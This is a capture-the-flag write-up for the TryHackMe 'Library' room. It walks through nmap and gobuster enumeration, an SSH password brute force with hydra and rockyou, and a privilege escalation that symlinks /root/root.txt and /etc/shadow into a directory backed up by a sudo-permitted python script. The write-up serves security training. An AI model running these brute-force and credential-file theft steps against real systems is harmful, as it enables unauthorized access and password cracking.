# Room
https://tryhackme.com/room/bsidesgtlibrary

# Task 1
* Enumeration - nmap
    ```
    nmap -A -T4 10.10.237.47

    Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-30 16:07 EST
    Nmap scan report for 10.10.237.47
    Host is up (0.13s latency).
    Not shown: 998 closed ports
    PORT   STATE SERVICE VERSION
    22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey: 
    |   2048 c4:2f:c3:47:67:06:32:04:ef:92:91:8e:05:87:d5:dc (RSA)
    |   256 68:92:13:ec:94:79:dc:bb:77:02:da:99:bf:b6:9d:b0 (ECDSA)
    |_  256 43:e8:24:fc:d8:b8:d3:aa:c2:48:08:97:51:dc:5b:7d (ED25519)
    80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
    | http-robots.txt: 1 disallowed entry 
    |_/
    |_http-server-header: Apache/2.4.18 (Ubuntu)
    |_http-title: Welcome to  Blog - Library Machine
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 23.70 seconds    
    ```
* Enumeration - gobuster
    ```
    gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.237.47 -t 50 -x txt,html,php
    ===============================================================
    Gobuster v3.0.1
    by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
    ===============================================================
    [+] Url:            http://10.10.237.47
    [+] Threads:        50
    [+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
    [+] Status codes:   200,204,301,302,307,401,403
    [+] User Agent:     gobuster/3.0.1
    [+] Extensions:     txt,html,php
    [+] Timeout:        10s
    ===============================================================
    2021/01/30 16:15:47 Starting gobuster
    ===============================================================
    /images (Status: 301)
    /index.html (Status: 200)
    /robots.txt (Status: 200)
    Progress: 60769 / 220561 (27.55%)^C
    [!] Keyboard interrupt detected, terminating.
    ===============================================================
    2021/01/30 16:26:37 Finished
    ===============================================================
    ```
* Enumeration - browse site / check robots.txt
    ```
    Browsing the site and we found four users that made comments: meliodas, root, www-data, and Anonymous

    Looking at robots.txt and we see the following:
    
    curl 10.10.237.47/robots.txt
    User-agent: rockyou 
    Disallow: /    
    ```
* Gaining Access - SSH Brute Force
    ```
    Robots.txt hints at rockyou, try to brute force the users, start with meliodas

    hydra -l meliodas -P /usr/share/wordlists/rockyou.txt 10.10.51.203 ssh
    Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

    Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-03-20 15:08:12
    [WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
    [WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
    [DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
    [DATA] attacking ssh://10.10.51.203:22/
    [STATUS] 177.00 tries/min, 177 tries in 00:01h, 14344223 to do in 1350:41h, 16 active
    [22][ssh] host: 10.10.51.203   login: meliodas   password: [removed]
    1 of 1 target successfully completed, 1 valid password found
    [WARNING] Writing restore file because 1 final worker threads did not complete until end.
    [ERROR] 1 target did not resolve or could not be connected
    [ERROR] 0 target did not complete
    Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-03-20 15:10:08
    ```
* Gaining Access - Test creds found from hydra
    ```
    ssh meliodas@10.10.51.203
    The authenticity of host '10.10.51.203 (10.10.51.203)' can't be established.
    ECDSA key fingerprint is SHA256:sKxkgmnt79RkNN7Tn25FLA0EHcu3yil858DSdzrX4Dc.
    Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
    Warning: Permanently added '10.10.51.203' (ECDSA) to the list of known hosts.
    meliodas@10.10.51.203's password: 
    Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-159-generic x86_64)

    * Documentation:  https://help.ubuntu.com
    * Management:     https://landscape.canonical.com
    * Support:        https://ubuntu.com/advantage
    Last login: Sat Aug 24 14:51:01 2019 from 192.168.15.118
    meliodas@ubuntu:~$ ls -lrta
    total 40
    drwxr-xr-x 3 root     root     4096 Aug 23  2019 ..
    -rw-r--r-- 1 meliodas meliodas  655 Aug 23  2019 .profile
    -rw-r--r-- 1 meliodas meliodas 3771 Aug 23  2019 .bashrc
    -rw-r--r-- 1 meliodas meliodas  220 Aug 23  2019 .bash_logout
    drwx------ 2 meliodas meliodas 4096 Aug 23  2019 .cache
    -rw-r--r-- 1 meliodas meliodas    0 Aug 23  2019 .sudo_as_admin_successful
    drwxrwxr-x 2 meliodas meliodas 4096 Aug 23  2019 .nano
    -rw-r--r-- 1 root     root      353 Aug 23  2019 bak.py
    -rw-rw-r-- 1 meliodas meliodas   33 Aug 23  2019 user.txt
    -rw------- 1 root     root       44 Aug 23  2019 .bash_history
    drwxr-xr-x 4 meliodas meliodas 4096 Aug 24  2019 .
    meliodas@ubuntu:~$ cat user.txt
    [removed]
    ```
* Login - Priv Esc
    ```
    Using the supplied creds allowed a login.  Run through les and linpeas.

    meliodas@ubuntu:~$ sudo -l                                                                                          
    Matching Defaults entries for meliodas on ubuntu:                                                                   
        env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin                                                                               
                                                                                                                        
    User meliodas may run the following commands on ubuntu:                                                             
        (ALL) NOPASSWD: /usr/bin/python* /home/meliodas/bak.py            

    The python script backups the /var/www/html directory which the user has write access to.  For the flag we can ln -s /root/root.txt rt in that directory and then run the backup, sudo /usr/bin/python /home/meliodas/bak.py.  Unzip the /var/backups/website.zip to /tmp and you've gained access to the flag.

    For priv esc we can use the same backup script but link to /etc/shadow for offline cracking with john or hashcat.  
    ```